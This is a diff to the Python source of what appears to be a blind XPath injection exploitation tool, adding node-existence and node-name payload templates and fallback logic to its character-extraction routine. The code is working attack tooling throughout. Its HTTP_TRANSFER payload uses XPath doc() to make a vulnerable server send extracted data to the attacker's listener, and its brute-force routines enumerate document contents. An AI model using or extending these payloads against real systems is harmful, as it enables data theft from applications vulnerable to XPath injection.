@@ -81,6 +81,8 @@ class PayloadMaker(object):
                      "REGEX_SUPPORT":"matches('test','.*')",
                      "HTTP_TRANSFER":string.Template("doc(concat('http://$URL$PORT/?$query=',encode-for-uri($node)))"),
                      "DOC_AVAILABLE":string.Template("doc-available('$URI')"),
+                     "NODE_EXISTS":string.Template("boolean($node)"),
+                     "NODE_NAME":string.Template("name($node)"),
                         },
                 "1":{
                      "COUNT_CHILDREN":("count($node)=$count", ),
@@ -194,10 +196,9 @@ def _getCharactersHttp(node, payload, name):
     query_id = "a"
     if name:
         node = "name(%s)"%node
-    
     class Handler(BaseHTTPServer.BaseHTTPRequestHandler):
-        def log_request(self, code='-', size='-'):
-            return 
+        #def log_request(self, code='-', size='-'):
+        #    return
         
         def do_GET(self):
             query = urlparse.parse_qs(urlparse.urlparse(self.path).query)
@@ -234,6 +235,14 @@ def _getCharactersHttp(node, payload, name):
         
 
 def getCharacters(node, payload, size=None, name=False):
+    if name:
+        q = payloads.BASE.substitute(payload=payloads.node_exists.substitute(node=payloads.node_name.substitute(node=node)))
+    else:
+        q = payloads.BASE.substitute(payload=payloads.node_exists.substitute(node=node))
+
+    if not executeQuery(args.URL, q, args.true_keyword or args.false_keyword):
+        return ""
+
     searchspace = string.ascii_letters+string.digits+string.punctuation
     if size and size > 10:
         if args.use_regex and args.xversion == "2":
@@ -262,6 +271,11 @@ def getCharacters(node, payload, size=None, name=False):
         x = _getCharactersHttp(node, payload, name)
         if x:
             return x
+        else:
+            if name:
+                size = countContents(payloads.node_name.substitute(node=node))
+            else:
+                size = countContents(node)
     if not size:
         return _getCharactersSingle(node, payload, searchspace)
     return _getCharactersThreadPool(node, payload, size, searchspace)
